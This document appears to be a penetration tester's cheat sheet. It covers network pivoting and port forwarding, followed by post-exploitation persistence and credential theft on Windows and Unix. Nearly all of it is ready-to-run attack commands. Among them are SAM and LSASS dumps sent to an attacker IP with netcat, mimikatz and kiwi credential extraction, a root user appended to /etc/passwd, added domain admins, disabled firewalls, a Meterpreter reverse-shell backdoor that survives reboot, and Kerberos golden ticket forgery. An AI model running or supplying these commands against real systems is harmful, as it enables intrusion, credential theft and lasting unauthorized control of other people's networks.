## Pivoting & Redirection:  

	Port Forwarding: For internal network pivoting, firewall avoidance, local connect to mysql, etc.
	SSH Tunneling:
		**Add Tunnel to Existing Session:  ~C  ;  -L 3333:newhost:22
        	Remove tunnel from current session:  ~C  ;  -KL/KR <port>
    		Making tunnels global (so another host can connect to them):  preface L or R with -g or use 0.0.0.0: before local port
	    Local Port Forwarding:
		ex. bypass firewall or address translation
		ssh user@1.1.1.1 -L<listener config>:<forwarder config>  ->  ssh -L [bind_address:]port:host:hostport [username@address]
		on attack box:    sudo ssh -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128   (uses ssh to tunnel through firewall and host)
		    then can connect locally on our attack box:  smbclient -L 127.0.0.1 -U Administrator
	    Remote Port Forwarding:
		ex. MITM; PAT/send connection out
		ssh user@1.1.1.1 -R<listener config>:<forwarder config>  ->  ssh -R [bind_address:]port:host:hostport [username@address]
		then on the victim:   ssh -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
		    with listener running on kali (port 2221)
		    then on kali we can do:  sudo nmap -sS -sV 127.0.0.1 -p 2221  and it scans the victim port 3306
	    Dynamic Port Forwarding:
		Proxychains default port is 9050 (/etc/proxychains.conf)
		ssh -D <port> -p <alt port> <user>@<pivot ip>
		ex. ssh -D 127.0.0.1:9050 student@10.11.0.128 ; proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
	    Reverse Dynamic Port Forwarding:
		...
	Deployable Tools:
		FPipe (Windows)
		    ex. fpipe -l 53 [-s 53] -r 80 192.168.1.101
		    Using Meterpreter:
			upload /tmp/fpipe.exe c:/windows/temp/fp.exe
			run multicommand -cl 'cmd.exe /c netsh advfirewall firewall show rule profile=any name=all'
			execute -f c:/windows/temp/fp.exe -a '-l 3389 -r 22 192.168.200.69'
			run multicommand -cl 'cmd.exe /c netsh advfirewall firewall add rule name=3389 dir=in action=allow protocol=TCP localport=3389'
			-L 33389:172.17.20.10:3389
			ssh user@localhost -p 33389
		Socat (Unix)
			TCP Forward:  socat TCP-LISTEN:8080,fork TCP-CONNECT:192.168.111.114:80
			UDP Forward:  socat UDP4-RECVFROM:161,fork UDP4-SENDTO:localhost:10161
			UDP/TCP:  socat UDP-LISTEN:137 TCP-CONNECT:127.0.0.1:3333
			    For hybrid, use convert locally UDP-TCP, and use TCP SSH tunnels to transmit
		Netcat Relays:
			cd /tmp; mknod backpipe p
			Listener-to-Client Relay:  sends packets from local port to a netcat client connected to TargetIP
				nc -lp [LocalPort] 0<backpipe | nc [TargetIP] [port] | tee backpipe
			Listener-to-Listener Relay:  sends packets from any connnection on LocalPort1 to any connection on LocalPort2
				nc -lp [LocalPort1] 0<backpipe | nc -lp [LocalPort2] | tee backpipe
			Client-to-Client Relay:  sends packets from the connection to PreviousHopIPaddr on port to a netcat client connected to NextHopIP on port2
				nc [PreviousHopIPaddr] [port] 0<backpipe | nc [NextHopIPaddr] [port2] | tee backpipe
		RINETD
			Requires install - sudo apt update && sudo apt install rinetd
			rules in /etc/rinetd.conf:   # bindadress bindport connectaddress connectport
			ex. 0.0.0.0 80 216.58.207.142 80
			sudo service rinetd restart
		Chisel:
			...
		Plink.exe (Windows):
			ex. if we have system access to a windows machine but there's inbound port filtering, and we want to access mysql on port 3306
			transfer program to victim
			on windows victim:   cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
			    then we can do:  sudo nmap -sS -sV 127.0.0.1 -p 1234
		HTTPTunneling through Deep Packet Inspection:
			ex. if we got root on linux victim, but firewall only allows http packets, not ssh
			sudo apt install httptunnel
			on linux victim:  ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
			    forwards to windows server deeper in network
			    then hts --forward-port localhost:8888 1234   (forwards local 1234 to 8888)
			on kali:   htc --forward-port 8080 10.11.0.128:1234
			then we can access windows server on kali by rdesktop 127.0.0.1:8080				
		ex. FPipe:
			ssh user@203.1.1.1 -L 1111:192.0.2.78:23 -L 2222:192.0.2.78:9999
			telnet localhost 1111
				fpipe -l 9999 -r 23 192.168.108.31
			telnet localhost 2222
		ex. Socat UDP/TCP:
			ssh user@100.1.1.1 -p 2222 -L 1111:198.18.30.5:22
			ssh user2@localhost -p 1111 -L 3333:localhost:3333
			Target Neighbor:  socat TCP-LISTEN:3333 UDP-CONNECT:198.18.30.12:137
			Linux Op Station:  socat UDP-LISTEN:137 TCP-CONNECT:127.0.0.1:3333
			From WinOps:  nbtstat -A 192.168.11.13
	Native Tools:
		Windows:  portproxy
		    netsh interface portproxy set v4tov4 listenport=2222 connectaddress=192.168.108.31 connectport=23 [listenaddress=127.0.0.1 protocol=tcp]
			*Remember to Allow Firewall:   runas /user:Administrator "netsh advfirewall firewall add rule name=1323 dir=in action=allow protocol=TCP localport=1323"
			Using Meterpreter:
				run multicommand -cl 'cmd.exe /c netsh interface portproxy set v4tov4 listenport=3389 connectaddress=192.168.200.69 connectport=22'
				run multicommand -cl 'cmd.exe /c netsh advfirewall firewall add rule name=3389 dir=in action=allow protocol=TCP localport=3389'
				ssh user@localhost -p 33389
		Or:  run post/windows/manage/portproxy ...
		Unix:  iptables
		    *First check for routing, and conntrack module:  cat /proc/sys/net/ipv4/ip_forward  (echo 1 > /proc/sys/net/ipv4/ip_forward) ;  lsmod | grep conntrack
		    Translate to Target Address (Forward):  iptables -t nat -A PREROUTING -p tcp --dport 1323 -d 192.168.108.31 -s 172.17.10.71 -j DNAT --to-destination 192.168.113.177:23
			**Also hide source (allows to return here):  iptables -t nat -A POSTROUTING -p tcp --dport 23 -d 192.168.113.177 -s 172.17.10.71 -j SNAT --to-source 192.168.108.31
			*Also enable Firewall:  iptables -A FORWARD -p tcp --dport 23 -d 192.168.113.177 -s 172.17.10.71 -j ACCEPT
			    *And Back:  iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
			Another Example:
				-L8080:192.0.2.79:8080
				iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 8080 -j DNAT --to-destination 192.168.255.12:80
				If conntrack module is loaded, no need for a reversing rule
				echo 1 > /proc/sys/net/ipv4/ip_forward
				iptables -I RH-Firewall-1-INPUT 10 -p tcp --dport 80 -j ACCEPT
				iptables -t nat -A POSTROUTING -p tcp --dport 80 -d 192.168.255.12 -j SNAT --to-source 172.17.10.79
				nc -n 127.0.0.1 8080
        Pivoting with Meterpreter:
		*Use MSF portfwd when possible
		Within Meterpreter:  portfwd add -l <local port on the attacking machine (yours)> -p <victim port we want to access> -r <victim IP address>  ;  portfwd list  -  like SSH local forwarding  (help: portfwd -h)
			Forward:
				ex. portfwd add -L 127.0.0.1 -l 55555 -r 192.168.0.11 -p 55555
				ex. portfwd add -L 127.0.0.1 -l 2222 -r 192.168.200.69 -p 22 ; ssh user@localhost -p 2222
			Reverse (for intermediate reverse shell callback):  portfwd add -R -L 192.168.106.52 -l 9998 -p 9999  (reverse forward T2 9999 to T1 9998) (ran on T2)
				**portfwd add -R -L 127.0.0.1 -l RHP1 -r 192.168.106.52 -p RHP2  (run on meterp session of .106.52 box)
					**-r can be the listening box interface, or the box that will connect to it
				ex. portfwd add -R -L 127.0.0.1 -l 8888 [-r 192.168...] -p 9999    (forwards [192.168... interface on victim] 9999 to my 8888)
		run autoroute -s 10.1.13.0/24   -  then attack directly in MSF  (help: run autoroute -h)
		*Add Route (within MSF):  background; route add 192.168.0.0 255.255.255.0 <session_id>
		PSExec/PTH (port 445):  use exploit/windows/smb/psexec  \\  use admin/smb/psexec_command (stealthier)
			*Note: psexec uses powershell, so logging may be active; ****MAKE SURE TO USE PAYLOAD WITH PSEXEC--otherwise will try to connect directly to attack box
			Enable Firewall to Connect Back through:  run multicommand -cl 'cmd.exe /c netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389'          
	Firewall Modifications:
	    Unix:
		sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.11.13 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
	    Windows:
		New Rule:  run multicommand -cl 'cmd.exe /c netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389'
			Delete:  run multicommand -cl 'cmd.exe /c netsh advfirewall firewall delete rule name=RDP'
		Modify Existing Rule:  run multicommand -cl 'cmd.exe /c netsh advfirewall firewall set rule name=callforhelp new remoteip=any'

## Persistence/Credentials:

    Unix:
        Add User:  echo root2:w08rKyoC9ECsg:0:0:/root:/bin/bash >> /etc/passwd     #password
        cat /etc/passwd /etc/shadow

    Windows:
    	Post-Exploitation Metasploit Modules:  https://www.infosecmatter.com/post-exploitation-metasploit-modules-reference/
        Credentials:
            SAM Files:
                Dump (if admin):  reg save hklm\sam c:\sam, reg save hklm\system c:\system,  and transfer back:  nc64.exe 10.10.14.18 4445 < SAMS   ,  nc -nvlp 4445 > SAMS
                Decrypt (Unix):  python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM [ip]
                Decrypt (Windows):  mimikatz.exe; privilege::debug; token::elevate; lsadump::sam filename1.hiv filename2.hiv
                Crack:  hashcat -m 1000 -a 0 --force --show --username hash.txt wordlist1.lst
            Meterpreter:  
	    	hashdump  \\  Better:  run hashdump \ run post/windows/gather/smart_hashdump
	    		john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
			use auxiliary/analyze/jtr_crack_fast
		GPO creds:  use post/windows/gather/credentials/gpp, set ... DOMAINS=BOOT SESSION=#
	   	run credcollect
	    	steal_token <PID> / drop_token
            Mimikatz: pull credentials from memory
                Local:  mimikatz.exe; privilege::debug; sekurlsa::logonpasswords full  \\  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
                    In Meterpreter:  load mimikatz; msv  \\  creds_all  \\  kerberos  \\  mimikatz_command -f samdump::hashes  \\  mimikatz_command -f sekurlsa::searchPasswords  \\  execute -H -i -c -f /root/Desktop/Mimikatz/x64/mimikatz.exe -m
                	Option 1: load kiwi; creds_all  \\  creds_msv  \\  creds_kerberos   (require System)
			Option 2: load kiwi; kiwi_cmd "privilege::debug"; kiwi_cmd "sekurlsa::logonPasswords full"; kiwi_cmd "sekurlsa::credman"; kiwi_cmd "SEKURLSA::Kerberos"; kiwi_cmd "SEKURLSA::Krbtgt"; kiwi_cmd "SEKURLSA::SSP"; kiwi_cmd "SEKURLSA::Wdigest"
		From LSASS dump:
                    from task manager  \\  procdump -ma lsass.exe lsass.dmp  \\  Import-Module .\OutMiniDump.ps1; Get-Process lsass | Out-Minidump (https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1)
                    mimikatz “sekurlsa::minidump C:\Users\username\AppData\Local\Temp\lsass.DMP”; sekurlsa::logonPasswords
        Persistence:
	        Add User:  net user <user> <pass> /add; net localgroup "Administrators" <USER> /add
			Meterpreter:  run multicommand -cl "cmd.exe /c net user metasploit p@55w0rd /ADD","cmd.exe /c net localgroup 'Administrators' metasploit /ADD" ; Domain: run multicommand -cl "cmd.exe /c net user metasploit p@55w0rd /ADD /DOMAIN","cmd.exe /c net group "Domain Admins" metasploit /ADD /DOMAIN"
				Make Domain Admin:  run multicommand -cl 'cmd.exe /c net group "Domain admins" mossa /add /domain'; run multicommand -cl 'cmd.exe /c net group "Domain admins" /domain'
		RDP:
		    Enable RDP Access:
			reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
			netsh firewall set service remoteadmin enable
			netsh firewall set service remotedesktop enable
		    Add RDP User:  net localgroup "Remote Desktop Users" <USER> /add
		    Meterpreter:  run post/windows/manage/enable_rdp username=admin,password=password
		    	Or: run getgui -e  //  or  run getgui -u loneferret -p password  ;  then cleanup:  ex. run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__....rc
		Telnet:  run gettelnet [-e  //  -u user -p pass]
		Turn Off Firewall:
		    Newer:  netsh advfirewall set allprofiles state off
		    Older:  netsh firewall set opmode disable
		Meterpreter Bind Backdoor:  run metsvc; use exploit/multi/handler; set PAYLOAD windows/metsvc_bind_tcp; set LPORT 31337; set RHOST 192.168.1.104; run
			Reverse Backdoor (reboot persistent):  run persistence -U -i 5 -p 443 -r 192.168.1.71; use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.71; set LPORT 443; exploit
		Meterpreter Golden Ticket:  load kiwi;  golden_ticket_create -u mossa -d BOOT.LAB -k (krbtgt hash last half only) -s (Domain User SID w/o last 4 digits--from enum_users) -t /tmp/ticket
			kerberos_ticket_list; kerberos_ticket_use /tmp/ticket
